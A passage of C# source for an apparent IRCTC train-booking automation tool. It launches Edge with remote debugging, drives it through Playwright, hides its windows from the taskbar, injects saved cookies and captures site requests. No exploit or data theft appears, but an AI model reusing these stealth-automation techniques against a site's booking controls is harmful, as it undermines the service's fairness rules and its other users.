                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                DisableEdgePasswordManager(userDataDir00);
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                IPage page2 = page;
                string url = "https://www.irctc.co.in/nget/train-search";
                var response = page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                if (response != null)
                {
                    string finalUrl = response.Url;
                    int statusCode = response.Status;

                    Console.WriteLine("URL : " + finalUrl);
                    Console.WriteLine("Status : " + statusCode);
                }

                // Full HTML Read
                string html = page2.ContentAsync().GetAwaiter().GetResult();
                if (!html.Contains("Book train tickets online instantly on IRCTC"))
                {
                    continue;
                }
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
                    }
                }
                if (num == 0)
                {
                    num++;
                    continue;
                }
                BrowserLoded = false;
            }
            break;
        }
        return page;
    }

    private void DismissIrctcLanguageAlert(IPage page)
    {
        try
        {
            bool seen = false;
            for (int i = 0; i < 16; i++)
            {
                string b = page.ContentAsync().GetAwaiter().GetResult() ?? "";
                if (b.Contains("Please select your preferred language") || b.Contains("Welcome to IRCTC"))
                { seen = true; break; }
                Thread.Sleep(500);
            }
            if (!seen) return;

            try
            {
                ILocator en = page.GetByText("English").First;
                if (en.CountAsync().GetAwaiter().GetResult() > 0)
                {
                    en.ClickAsync(new LocatorClickOptions { Timeout = 2500 }).GetAwaiter().GetResult();
                    Thread.Sleep(250);
                }
                Thread.Sleep(5000);
            }
            catch { }

            try
            {
                ILocator ok = page.Locator(
                    "button:has-text('Continue'), button:has-text('CONTINUE'), " +
                    "button:has-text('OK'), input[type=submit]").First;
                if (ok.CountAsync().GetAwaiter().GetResult() > 0)
                {
                    ok.ClickAsync(new LocatorClickOptions { Timeout = 2500 }).GetAwaiter().GetResult();
                    Thread.Sleep(500);
                }
            }
            catch { }

            try { page.Keyboard.PressAsync("Enter").GetAwaiter().GetResult(); } catch { }
            Thread.Sleep(800);
        }
        catch { }
    }
    //internal IPage StartEdgeAndConnect_new_1( ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    //{
    //    Random random = new Random();
    //    int num = 0;
    //    Process process = null;
    //    while (true)
    //    {
    //        IntPtr windowsTaskbar = IntPtr.Zero;

    //        try
    //        {
    //            int freeTcpPort = GetFreeTcpPort();

    //            if (!string.IsNullOrEmpty(userDataDir00))
    //            {
    //                KillOldEdgeByProfile(userDataDir00);
    //            }
    //            else
    //            {
    //                string tempPath = Path.GetTempPath();
    //                string path = "EdgeProfiles";
    //                string path2 = Path.Combine(tempPath, path);
    //                string text = "Profile_";
    //                Guid guid = Guid.NewGuid();
    //                string text2 = "N";

    //                userDataDir00 =
    //                    Path.Combine(
    //                        path2,
    //                        text + guid.ToString(text2));

    //                userDataDir00 =
    //                    Path.Combine(
    //                        Path.GetTempPath(),
    //                        "uc_" + Guid.NewGuid().ToString("N"));

    //                if (!Directory.Exists(userDataDir00))
    //                {
    //                    Directory.CreateDirectory(userDataDir00);
    //                }
    //            }

    //            Thread.Sleep(1000);

    //            Convert.ToBase64String(
    //                Encoding.UTF8.GetBytes(blankHtml));

    //            string edgePath = GetEdgePath();

    //            string format =
    //                "--remote-debugging-port={0} ";

    //            string text3 =
    //                string.Format(
    //                    format,
    //                    freeTcpPort);

    //            string text4 =
    //                "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";

    //            string text5 =
    //                userDataDir00;

    //            DisableEdgePasswordManager(
    //                userDataDir00);

    //            //string text6 ="\" --no-first-run " +"--disable-session-crashed-bubble " +"--disable-save-password-bubble " +"--disable-infobars " +"--disable-sync " +"--disable-features=msEdgeSync " +"https://www.irctc.co.in/nget/assets/images/logo.png";
    //            string text6 =
    //"\" --no-first-run " +
    //"--no-default-browser-check " +
    //"--disable-session-crashed-bubble " +
    //"--disable-save-password-bubble " +
    //"--disable-infobars " +
    //"--disable-sync " +
    //"--password-store=basic " +
    //"--disable-features=msEdgeFirstRunExperience,msEdgeSync,PasswordManagerEnabled " +
    //"--app=https://www.irctc.co.in/nget/train-search";

    //            string windowPosition =
    //                " --window-position=" +
    //                rect.X +
    //                "," +
    //                rect.Y +
    //                random.Next(900, 1550);

    //            string text7 =
    //                text3 +
    //                text4 +
    //                text5 +
    //                text6 +
    //                windowPosition;

    //            // =====================================================
    //            // WINDOWS TASKBAR HIDE BEFORE EDGE LAUNCH
    //            // =====================================================

    //            windowsTaskbar =
    //                FindWindow(
    //                    "Shell_TrayWnd",
    //                    null);

    //            if (windowsTaskbar != IntPtr.Zero)
    //            {
    //                ShowWindow(
    //                    windowsTaskbar,
    //                    SW_HIDE);
    //            }

    //            // =====================================================
    //            // EXISTING EDGE LAUNCH
    //            // =====================================================

    //            if (num == 0)
    //            {
    //                string text8 =
    //                    "/c start \"\" \"";

    //                string text9 =
    //                    "\" ";

    //                string arguments =
    //                    text8 +
    //                    edgePath +
    //                    text9 +
    //                    text7;

    //                ProcessStartInfo processStartInfo =
    //                    new ProcessStartInfo();

    //                string fileName =
    //                    "cmd.exe";

    //                processStartInfo.FileName =
    //                    fileName;

    //                processStartInfo.Arguments =
    //                    arguments;

    //                processStartInfo.CreateNoWindow =
    //                    true;

    //                processStartInfo.UseShellExecute =
    //                    false;

    //                string verb =
    //                    "runas";

    //                processStartInfo.Verb =
    //                    verb;

    //                process =
    //                    Process.Start(
    //                        processStartInfo);
    //            }
    //            else
    //            {
    //                process =
    //                    Process.Start(
    //                        new ProcessStartInfo
    //                        {
    //                            FileName = edgePath,
    //                            Arguments = text7,
    //                            UseShellExecute = false,
    //                            WindowStyle =
    //                                ProcessWindowStyle.Normal
    //                        });
    //            }

    //            Thread.Sleep(5000);

    //            // =====================================================
    //            // EXISTING EDGE PORT CHECK
    //            // =====================================================

    //            bool flag = false;
    //            int num2 = 0;

    //            string value =
    //                "[Info] Waiting for Edge port to open...";

    //            Console.WriteLine(value);

    //            while (!flag && num2 < 5)
    //            {
    //                try
    //                {
    //                    using (TcpClient tcpClient =
    //                        new TcpClient())
    //                    {
    //                        string hostname =
    //                            "127.0.0.1";

    //                        tcpClient.Connect(
    //                            hostname,
    //                            freeTcpPort);

    //                        flag = true;
    //                    }
    //                }
    //                catch
    //                {
    //                    Thread.Sleep(1000);
    //                    num2++;
    //                }
    //            }

    //            if (!flag)
    //            {
    //                string text10 =
    //                    "Edge Connection Faield";

    //                MessageBox.Show(text10);
    //            }

    //            // =====================================================
    //            // EXISTING PLAYWRIGHT CDP CONNECTION
    //            // =====================================================

    //            IBrowserType chromium =
    //                Playwright
    //                    .CreateAsync()
    //                    .GetAwaiter()
    //                    .GetResult()
    //                    .Chromium;

    //            string format2 =
    //                "http://127.0.0.1:{0}";

    //            IBrowserContext browserContext =
    //                chromium
    //                    .ConnectOverCDPAsync(
    //                        string.Format(
    //                            format2,
    //                            freeTcpPort))
    //                    .GetAwaiter()
    //                    .GetResult()
    //                    .Contexts[0];

    //            if (browserContext.Pages.Count <= 0)
    //            {
    //                page =
    //                    browserContext
    //                        .NewPageAsync()
    //                        .GetAwaiter()
    //                        .GetResult();
    //            }
    //            else
    //            {
    //                page =
    //                    browserContext.Pages[0];
    //            }

    //            // =====================================================
    //            // FIND EDGE WINDOW + REMOVE EDGE FROM TASKBAR
    //            // =====================================================

    //            IntPtr intPtr = IntPtr.Zero;

    //            try
    //            {
    //                // Edge HWND milne tak short wait.
    //                for (int h = 0; h < 50; h++)
    //                {
    //                    intPtr =
    //                        EdgeTaskbarHider
    //                            .FindEdgeWindowByUserDataDir(
    //                                userDataDir00);

    //                    if (intPtr != IntPtr.Zero)
    //                    {
    //                        // Existing Edge taskbar hiding.
    //                        EdgeTaskbarHider
    //                            .HideFromTaskbar(
    //                                intPtr);

    //                        break;
    //                    }

    //                    Thread.Sleep(100);
    //                }
    //            }
    //            finally
    //            {
    //                // =================================================
    //                // EDGE TASKBAR SE HIDE HO GAYA
    //                // WINDOWS TASKBAR WAPAS SHOW
    //                // =================================================

    //                if (windowsTaskbar != IntPtr.Zero)
    //                {
    //                    ShowWindow(
    //                        windowsTaskbar,
    //                        SW_SHOW);

    //                    windowsTaskbar =
    //                        IntPtr.Zero;
    //                }
    //            }

    //            // =====================================================
    //            // EXISTING WINDOW POSITION CODE
    //            // =====================================================

    //            try
    //            {
    //                ICDPSession result =
    //                    page.Context
    //                        .NewCDPSessionAsync(page)
    //                        .GetAwaiter()
    //                        .GetResult();

    //                string method =
    //                    "Browser.getWindowForTarget";

    //                JsonElement? result2 =
    //                    result
    //                        .SendAsync(method)
    //                        .GetAwaiter()
    //                        .GetResult();

    //                if (result2.HasValue)
    //                {
    //                    JsonElement value2 =
    //                        result2.Value;

    //                    string propertyName =
    //                        "windowId";

    //                    int @int =
    //                        value2
    //                            .GetProperty(propertyName)
    //                            .GetInt32();

    //                    int width =
    //                        rect.Width;

    //                    int num4 =
    //                        rect.Height;

    //                    int x =
    //                        rect.X;

    //                    int y =
    //                        rect.Y;

    //                    Dictionary<string, object> dictionary =
    //                        new Dictionary<string, object>();

    //                    string key =
    //                        "windowId";

    //                    dictionary.Add(
    //                        key,
    //                        @int);

    //                    string key2 =
    //                        "bounds";

    //                    Dictionary<string, object> dictionary2 =
    //                        new Dictionary<string, object>();

    //                    string key3 =
    //                        "left";

    //                    dictionary2.Add(
    //                        key3,
    //                        x);

    //                    string key4 =
    //                        "top";

    //                    dictionary2.Add(
    //                        key4,
    //                        y + random.Next(900, 1550));

    //                    string key5 =
    //                        "width";

    //                    dictionary2.Add(
    //                        key5,
    //                        width);

    //                    string key6 =
    //                        "height";

    //                    dictionary2.Add(
    //                        key6,
    //                        num4);

    //                    string key7 =
    //                        "windowState";

    //                    string value3 =
    //                        "normal";

    //                    dictionary2.Add(
    //                        key7,
    //                        value3);

    //                    dictionary.Add(
    //                        key2,
    //                        dictionary2);

    //                    Dictionary<string, object> args =
    //                        dictionary;

    //                    string method2 =
    //                        "Browser.setWindowBounds";

    //                    result
    //                        .SendAsync(
    //                            method2,
    //                            args)
    //                        .GetAwaiter()
    //                        .GetResult();
    //                }
    //            }
    //            catch (Exception ex)
    //            {
    //                MessageBox.Show(
    //                    ex.ToString());
    //            }

    //            // =====================================================
    //            // EXISTING REQUEST CAPTURE
    //            // =====================================================

    //            CaptureIRCTCRequests(page);

    //            // =====================================================
    //            // EXISTING IRCTC NAVIGATION
    //            // =====================================================

    //            IPage page2 =
    //                page;

    //            string url =
    //                "https://www.irctc.co.in/nget/train-search";

    //            var response =
    //                page2
    //                    .GotoAsync(
    //                        url,
    //                        new PageGotoOptions
    //                        {
    //                            WaitUntil =
    //                                WaitUntilState.DOMContentLoaded
    //                        })
    //                    .GetAwaiter()
    //                    .GetResult();

    //            Thread.Sleep(5000);

    //            if (response != null)
    //            {
    //                string finalUrl =
    //                    response.Url;

    //                int statusCode =
    //                    response.Status;

    //                Console.WriteLine(
    //                    "URL : " + finalUrl);

    //                Console.WriteLine(
    //                    "Status : " + statusCode);
    //            }

    //            // ===== IRCTC language alert dismiss (agar aaya ho) =====
    //            DismissIrctcLanguageAlert(page2);

    //            // ===== page settle hone ka intezaar (max ~10 sec) =====
    //            bool okPage = false;
    //            string html = "";

    //            for (int t = 0; t < 20; t++)
    //            {
    //                try { html = page2.ContentAsync().GetAwaiter().GetResult() ?? ""; }
    //                catch { html = ""; }

    //                if ((page2.Url ?? "").Contains("/nget/") &&
    //                    html.Contains("Book train tickets online instantly on IRCTC"))
    //                {
    //                    okPage = true;
    //                    break;
    //                }

    //                Thread.Sleep(500);
    //            }

    //            // ===== fail hone par: purana process band karo, phir retry =====
    //            if (!okPage)
    //            {
    //                num++;

    //                if (num >= 3)
    //                {
    //                    BrowserLoded = false;
    //                    break;
    //                }

    //                try { if (process != null && !process.HasExited) process.Kill(); } catch { }

    //                Thread.Sleep(1000);
    //                continue;
    //            }

    //            BrowserLoded = true;
    //        }
    //        catch (Exception)
    //        {
    //            // =====================================================
    //            // ERROR SAFETY - WINDOWS TASKBAR RESTORE
    //            // =====================================================

    //            try
    //            {
    //                if (windowsTaskbar != IntPtr.Zero)
    //                {
    //                    ShowWindow(
    //                        windowsTaskbar,
    //                        SW_SHOW);

    //                    windowsTaskbar =
    //                        IntPtr.Zero;
    //                }
    //                else
    //                {
    //                    IntPtr taskbar =
    //                        FindWindow(
    //                            "Shell_TrayWnd",
    //                            null);

    //                    if (taskbar != IntPtr.Zero)
    //                    {
    //                        ShowWindow(
    //                            taskbar,
    //                            SW_SHOW);
    //                    }
    //                }
    //            }
    //            catch
    //            {
    //            }

    //            if (process != null &&
    //                !process.HasExited)
    //            {
    //                try
    //                {
    //                    process.Kill();
    //                }
    //                catch
    //                {
    //                }
    //            }

    //            if (num == 0)
    //            {
    //                num++;
    //                continue;
    //            }

    //            BrowserLoded = false;
    //        }

    //        break;
    //    }
    //    try
    //    {
    //        IntPtr taskbar =
    //            FindWindow(
    //                "Shell_TrayWnd",
    //                null);

    //        if (taskbar != IntPtr.Zero)
    //        {
    //            ShowWindow1(
    //                taskbar,
    //                SW_SHOW);
    //        }
    //    }
    //    catch
    //    {
    //    }

    //    return page;
    //}

    internal IPage StartEdgeAndConnect_new_1(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;

        while (true)
        {
            IntPtr windowsTaskbar = IntPtr.Zero;

            try
            {
                int freeTcpPort = GetFreeTcpPort();

                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldEdgeByProfile(userDataDir00);
                }
                else
                {
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));

                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }

                Thread.Sleep(1000);

                DisableEdgePasswordManager(userDataDir00);

                string edgePath = GetEdgePath();

                string text3 = string.Format("--remote-debugging-port={0} ", freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;

                // app mode + about:blank: New tab / first-run / language modal sab band
                string text6 =
                    "\" --no-first-run " +
                    "--no-default-browser-check " +
                    "--disable-session-crashed-bubble " +
                    "--disable-save-password-bubble " +
                    "--disable-infobars " +
                    "--disable-sync " +
                    "--password-store=basic " +
                    "--disable-features=msEdgeFirstRunExperience,msEdgeSync,PasswordManagerEnabled " +
                    //"--app=about:blank";
                    "--app=https://www.irctc.co.in/nget/train-search";

                int scrW = GetSystemMetrics(0);
                int scrH = GetSystemMetrics(1);
                int winW = Math.Min(rect.Width, scrW);
                int winH = Math.Min(rect.Height - random.Next(225, 250), scrH - 40);
                int winX = Math.Max(0, Math.Min(rect.X, scrW - winW));
                int winY = Math.Max(0, Math.Min(rect.Y, scrH - winH - 40));
                string windowPosition =
                    " --window-position=" + winX + "," + winY +
                    " --window-size=" + winW + "," + winH;

                string text7 = text3 + text4 + text5 + text6 + windowPosition;

                windowsTaskbar = FindWindow("Shell_TrayWnd", null);

                if (windowsTaskbar != IntPtr.Zero)
                {
                    ShowWindow(windowsTaskbar, SW_HIDE);
                }

                try { File.WriteAllText(Path.Combine(userDataDir00, "First Run"), ""); } catch { }
                ProcessStartInfo edgePsi = new ProcessStartInfo();
                edgePsi.FileName = edgePath;
                edgePsi.Arguments = text7;
                edgePsi.CreateNoWindow = true;
                edgePsi.UseShellExecute = false;
                process = Process.Start(edgePsi);

                Thread.Sleep(5000);

                bool flag = false;
                int num2 = 0;

                while (!flag && num2 < 5)
                {
                    try
                    {
                        using (TcpClient tcpClient = new TcpClient())
                        {
                            tcpClient.Connect("127.0.0.1", freeTcpPort);
                            flag = true;
                        }
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }

                if (!flag)
                {
                    MessageBox.Show("Edge Connection Faield");
                }

                IBrowserType chromium =
                    Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;

                IBrowserContext browserContext =
                    chromium.ConnectOverCDPAsync("http://127.0.0.1:" + freeTcpPort)
                            .GetAwaiter().GetResult()
                            .Contexts[0];

                // about:blank tab ko hi pakdo, restored tab nahi
                page = browserContext.Pages.FirstOrDefault(p => (p.Url ?? "").Contains("irctc.co.in"));

                if (page == null)
                {
                    page = browserContext.Pages.FirstOrDefault(p => !(p.Url ?? "").StartsWith("about:blank"));
                }

                if (page == null)
                {
                    page = browserContext.Pages.Count > 0
                        ? browserContext.Pages[0]
                        : browserContext.NewPageAsync().GetAwaiter().GetResult();
                }

                for (int sweep = 0; sweep < 10; sweep++)
                {
                    bool closedAny = false;
                    foreach (IPage oldPg in browserContext.Pages.ToList())
                    {
                        if (oldPg == page) continue;
                        try
                        {
                            oldPg.CloseAsync().GetAwaiter().GetResult();
                            closedAny = true;
                        }
                        catch { }
                    }
                    Thread.Sleep(closedAny ? 150 : 700);
                }

                IntPtr intPtr = IntPtr.Zero;

                try
                {
                    for (int h = 0; h < 50; h++)
                    {
                        intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);

                        if (intPtr != IntPtr.Zero)
                        {
                            EdgeTaskbarHider.HideFromTaskbar(intPtr);
                            try { SetForegroundWindow(intPtr); } catch { }
                            break;
                        }

                        Thread.Sleep(100);
                    }
                }
                finally
                {
                    if (windowsTaskbar != IntPtr.Zero)
                    {
                        ShowWindow(windowsTaskbar, SW_SHOW);
                        windowsTaskbar = IntPtr.Zero;
                    }
                }

                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    JsonElement? result2 = result.SendAsync("Browser.getWindowForTarget").GetAwaiter().GetResult();

                    if (result2.HasValue)
                    {
                        int @int = result2.Value.GetProperty("windowId").GetInt32();
                        int width = Math.Min(rect.Width, GetSystemMetrics(0));
                        int num4 = Math.Min(rect.Height - random.Next(225, 250), GetSystemMetrics(1) - 40);
                        int x = Math.Max(0, Math.Min(rect.X, GetSystemMetrics(0) - width));
                        int y = Math.Max(0, Math.Min(rect.Y, GetSystemMetrics(1) - num4 - 40));

                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        dictionary.Add("windowId", @int);

                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        dictionary2.Add("left", x);
                        dictionary2.Add("top", y);
                        dictionary2.Add("width", width);
                        dictionary2.Add("height", num4);
                        dictionary2.Add("windowState", "normal");

                        dictionary.Add("bounds", dictionary2);

                        result.SendAsync("Browser.setWindowBounds", dictionary).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Window bounds error: " + ex.ToString());
                }

                CaptureIRCTCRequests(page);

                try { LoadCookiesFromJsonToBrowser(browserContext); } catch { }

                IPage page2 = page;

                IResponse response = null;

                try
                {
                    if (!(page2.Url ?? "").Contains("irctc.co.in"))
                    {
                        response = page2.GotoAsync(
                            "https://www.irctc.co.in/nget/train-search",
                            new PageGotoOptions
                            {
                                WaitUntil = WaitUntilState.Load,
                                Timeout = 60000
                            }).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("IRCTC navigation error: " + ex.Message);
                }

                Thread.Sleep(3000);

                if (response != null)
                {
                    Console.WriteLine("URL : " + response.Url);
                    Console.WriteLine("Status : " + response.Status);
                }

                // language alert (agar aaya ho) band karo
                DismissIrctcLanguageAlert(page2);

                // page settle hone ka intezaar (max ~10 sec)
                bool okPage = false;
                string html = "";

                for (int t = 0; t < 20; t++)
                {
                    try { html = page2.ContentAsync().GetAwaiter().GetResult() ?? ""; }
                    catch { html = ""; }

                    if ((page2.Url ?? "").Contains("/nget/") &&
                        html.Contains("Book train tickets online instantly on IRCTC"))
                    {
                        okPage = true;
                        break;
                    }

                    Thread.Sleep(500);
                }

                if (!okPage)
                {
                    num++;

                    if (num >= 3)
                    {
                        BrowserLoded = false;
                        break;
                    }

                    try { if (process != null && !process.HasExited) process.Kill(); } catch { }

                    Thread.Sleep(1500);
                    continue;
                }

                // login trigger aane tak wait — clsMain ko ready page mile
                try
                {
                    page2.WaitForSelectorAsync(
                        "a.loginText, #loginStart, .search_btn",
                        new PageWaitForSelectorOptions { Timeout = 12000 })
                        .GetAwaiter().GetResult();
                }
                catch { }

                BrowserLoded = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Edge Launch Error] " + ex.ToString());

                try
                {
                    if (windowsTaskbar != IntPtr.Zero)
                    {
                        ShowWindow(windowsTaskbar, SW_SHOW);
                        windowsTaskbar = IntPtr.Zero;
                    }
                }
                catch { }

                if (process != null && !process.HasExited)
                {
                    try { process.Kill(); } catch { }
                }

                if (num == 0)
                {
                    num++;
                    continue;
                }

                BrowserLoded = false;
            }

            break;
        }

        return page;
    }
    internal IPage StartEdgeAndConnect_Beta(ref string userDataDir00, string directlogin, Rectangle rect, ref IPage page)
    {
        Random random = new Random();
        int num = 0;
        Process process = null;
        while (true)
        {
            try
            {
                int freeTcpPort = GetFreeTcpPort();
                if (!string.IsNullOrEmpty(userDataDir00))
                {
                    KillOldEdgeByProfile(userDataDir00);
                }
                else
                {
                    string tempPath = Path.GetTempPath();
                    string path = "EdgeProfiles";
                    string path2 = Path.Combine(tempPath, path);
                    string text = "Profile_";
                    Guid guid = Guid.NewGuid();
                    string text2 = "N";
                    userDataDir00 = Path.Combine(path2, text + guid.ToString(text2));
                    userDataDir00 = Path.Combine(Path.GetTempPath(), "uc_" + Guid.NewGuid().ToString("N"));
                    if (!Directory.Exists(userDataDir00))
                    {
                        Directory.CreateDirectory(userDataDir00);
                    }
                }
                Thread.Sleep(1000);
                Convert.ToBase64String(Encoding.UTF8.GetBytes(blankHtml));
                string edgePath = GetEdgePath();
                string format = "--remote-debugging-port={0} ";
                string text3 = string.Format(format, freeTcpPort);
                string text4 = "--remote-debugging-address=127.0.0.1 --user-data-dir=\"";
                string text5 = userDataDir00;
                string text6 = "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync --app=https://www.irctc.co.in/nget/assets/images/logo.png";
                string text7 = text3 + text4 + text5 + text6;
                if (num == 0)
                {
                    string text8 = "/c start \"\" \"";
                    string text9 = "\" ";
                    string arguments = text8 + edgePath + text9 + text7;
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    string fileName = "cmd.exe";
                    processStartInfo.FileName = fileName;
                    processStartInfo.Arguments = arguments;
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    string verb = "runas";
                    processStartInfo.Verb = verb;
                    process = Process.Start(processStartInfo);
                }
                else
                {
                    process = Process.Start(new ProcessStartInfo
                    {
                        FileName = edgePath,
                        Arguments = text7,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }
                Thread.Sleep(5000);
                bool flag = false;
                int num2 = 0;
                string value = "[Info] Waiting for Edge port to open...";
                Console.WriteLine(value);
                while (!flag && num2 < 5)
                {
                    try
                    {
                        using TcpClient tcpClient = new TcpClient();
                        string hostname = "127.0.0.1";
                        tcpClient.Connect(hostname, freeTcpPort);
                        flag = true;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        num2++;
                    }
                }
                if (!flag)
                {
                    string text10 = "Edge Connection Faield";
                    MessageBox.Show(text10);
                }
                IBrowserType chromium = Playwright.CreateAsync().GetAwaiter().GetResult().Chromium;
                string format2 = "http://127.0.0.1:{0}";
                IBrowserContext browserContext = chromium.ConnectOverCDPAsync(string.Format(format2, freeTcpPort)).GetAwaiter().GetResult().Contexts[0];
                if (browserContext.Pages.Count <= 0)
                {
                    page = browserContext.NewPageAsync().GetAwaiter().GetResult();
                }
                else
                {
                    page = browserContext.Pages[0];
                }
                IntPtr intPtr = EdgeTaskbarHider.FindEdgeWindowByUserDataDir(userDataDir00);
                if (intPtr != IntPtr.Zero)
                {
                    EdgeTaskbarHider.HideFromTaskbar(intPtr);
                }
                try
                {
                    ICDPSession result = page.Context.NewCDPSessionAsync(page).GetAwaiter().GetResult();
                    string method = "Browser.getWindowForTarget";
                    JsonElement? result2 = result.SendAsync(method).GetAwaiter().GetResult();
                    if (result2.HasValue)
                    {
                        JsonElement value2 = result2.Value;
                        string propertyName = "windowId";
                        int @int = value2.GetProperty(propertyName).GetInt32();
                        int num3 = random.Next(225, 250);
                        int width = rect.Width;
                        int num4 = rect.Height - num3;
                        int x = rect.X;
                        int y = rect.Y;
                        Dictionary<string, object> dictionary = new Dictionary<string, object>();
                        string key = "windowId";
                        dictionary.Add(key, @int);
                        string key2 = "bounds";
                        Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
                        string key3 = "left";
                        dictionary2.Add(key3, x);
                        string key4 = "top";
                        dictionary2.Add(key4, y);
                        string key5 = "width";
                        dictionary2.Add(key5, width);
                        string key6 = "height";
                        dictionary2.Add(key6, num4);
                        string key7 = "windowState";
                        string value3 = "normal";
                        dictionary2.Add(key7, value3);
                        dictionary.Add(key2, dictionary2);
                        Dictionary<string, object> args = dictionary;
                        string method2 = "Browser.setWindowBounds";
                        result.SendAsync(method2, args).GetAwaiter().GetResult();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
                CaptureIRCTCRequests(page);
                if (directlogin != "True")
                {
                    LoadCookiesFromJsonToBrowser(browserContext);
                }
                IPage page2 = page;
                string url = "https://www.irctc.co.in/eticket/train-search";
                var response = page2.GotoAsync(url, new PageGotoOptions
                {
                    WaitUntil = WaitUntilState.DOMContentLoaded
                }).GetAwaiter().GetResult();
                Thread.Sleep(5000);
                if (response != null)
                {
                    string finalUrl = response.Url;
                    int statusCode = response.Status;

                    Console.WriteLine("URL : " + finalUrl);
                    Console.WriteLine("Status : " + statusCode);
                }

                // Full HTML Read
                string html = page2.ContentAsync().GetAwaiter().GetResult();
                if (!html.Contains("Book train tickets online instantly on IRCTC"))
                {
                    continue;
                }
                BrowserLoded = true;
            }
            catch (Exception)
            {
                if (process != null && !process.HasExited)
                {
                    try
                    {
                        process.Kill();
                    }
                    catch
                    {
